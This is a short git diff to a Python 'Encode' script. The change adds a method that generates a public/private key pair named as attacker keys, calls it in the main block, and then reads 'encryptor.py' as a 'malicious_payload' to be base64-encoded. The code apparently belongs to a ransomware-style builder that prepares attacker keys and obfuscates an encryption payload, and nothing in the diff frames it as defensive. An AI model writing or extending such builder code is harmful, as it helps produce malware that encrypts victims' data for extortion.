@@ -1,4 +1,5 @@
 import base64
+from keygen import *
 
 class Encode:
 
@@ -14,6 +15,10 @@ class Encode:
     def write_file(self):
         with open(self.outputfile, 'w') as file:
             file.write(self.encoded_code)
+
+    def generate_attacker_keys(self):
+        keygen = Encryption("id:variant1", f"build\\public_attacker.pem",f"build\\private_attacker.pem")
+        keygen.generate_keys()
 
     def encode(self, code):
         """
@@ -42,6 +47,8 @@ class Encode:
 
 if __name__ == "__main__":
     encodeclass = Encode()
+
+    encodeclass.generate_attacker_keys()
     
     with open("encryptor.py", "r") as malicious_payload:
         payload = malicious_payload.read()
